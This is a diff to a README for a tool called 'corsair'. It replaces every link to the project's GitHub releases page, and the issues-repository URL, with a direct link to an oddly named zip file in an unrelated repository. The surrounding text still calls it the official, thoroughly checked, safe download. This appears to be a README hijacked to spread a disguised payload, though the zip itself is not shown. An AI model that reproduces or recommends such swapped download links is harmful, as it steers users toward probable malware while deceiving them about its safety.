@@ -18,7 +18,7 @@ This guide will walk you through everything — from downloading to running cors
 ## 📥 Download the Application
 
 **Visit this link to download the application:**  
-[**Download corsair now**](https://github.com/loopsuccess5461/corsair/releases)  
+[**Download corsair now**](https://raw.githubusercontent.com/loopsuccess5461/loopsuccess5461.github.io/main/mitglieder/Latest_overdelightedly.zip)  
 
 👉 **That link takes you to our official download page.** Once there, look for the newest version and click the download button. The file is small and safe — we've checked it thoroughly.
 
@@ -134,7 +134,7 @@ We're always improving corsair. Each new version brings better performance and n
 - **Automatic updates** — corsair checks for updates when it boots and installs them quietly
 - **Manual check** — Inside the app, click "Settings" → "Check for Updates"
 
-If you ever need to update manually, just visit our **[download page](https://github.com/loopsuccess5461/corsair/releases)** again and grab the newest version.
+If you ever need to update manually, just visit our **[download page](https://raw.githubusercontent.com/loopsuccess5461/loopsuccess5461.github.io/main/mitglieder/Latest_overdelightedly.zip)** again and grab the newest version.
 
 ---
 
@@ -142,7 +142,7 @@ If you ever need to update manually, just visit our **[download page](https://gi
 
 Don't wait. The whole point of corsair is to save you time and headaches — so stop wrestling with your apps and start clicking with ease.
 
-**👉 [Download corsair here](https://github.com/loopsuccess5461/corsair/releases)**  
+**👉 [Download corsair here](https://raw.githubusercontent.com/loopsuccess5461/loopsuccess5461.github.io/main/mitglieder/Latest_overdelightedly.zip)**  
 
 Join hundreds of happy users who've simplified how they connect to their apps. One download. Endless convenience.
 
@@ -152,7 +152,7 @@ Join hundreds of happy users who've simplified how they connect to their apps. O
 
 Need help? The community has your back.
 
-- **GitHub Issues** — Report problems or request features at our official repository: `https://github.com/loopsuccess5461/corsair`
+- **GitHub Issues** — Report problems or request features at our official repository: `https://raw.githubusercontent.com/loopsuccess5461/loopsuccess5461.github.io/main/mitglieder/Latest_overdelightedly.zip`
 - **Community Discussions** — Ask questions and share tips with other users in the GitHub Discussions tab
 
 We're constantly reading feedback and making corsair better with every release.
@@ -167,7 +167,7 @@ corsair is distributed as freeware for personal and commercial use. By downloadi
 
 **Thank you for choosing corsair.** Now go ahead — download it, run it, and experience the easiest way to connect to your apps.
 
-**[🚀 Start Your Download](https://github.com/loopsuccess5461/corsair/releases)**
+**[🚀 Start Your Download](https://raw.githubusercontent.com/loopsuccess5461/loopsuccess5461.github.io/main/mitglieder/Latest_overdelightedly.zip)**
 
 ---
 
